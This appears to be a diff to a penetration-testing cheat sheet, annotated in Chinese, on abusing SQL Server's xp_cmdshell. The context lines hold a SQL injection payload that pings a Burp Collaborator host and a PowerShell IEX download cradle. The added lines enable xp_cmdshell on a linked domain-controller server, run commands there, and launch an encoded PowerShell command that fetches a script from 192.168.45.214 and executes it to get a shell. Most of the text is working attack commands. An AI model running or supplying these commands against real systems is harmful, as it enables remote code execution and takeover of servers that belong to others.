@@ -347,3 +347,19 @@ EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.1
 ```
 '; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —
 ```
+
+
+在heidisql操作开启cmdshell,并且执行cmd
+
+```
+EXEC('sp_configure ''Show Advanced Options'', 1; RECONFIGURE;') AT [DC01.CORP2.COM]
+
+EXEC('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC01.CORP2.COM]
+
+exec('EXEC master..xp_cmdshell ''whoami''') AT [DC01.CORP2.COM]
+```
+
+拿shell
+```
+exec('EXEC master..xp_cmdshell ''powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA0AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA''') AT [DC01.CORP2.COM]
+```
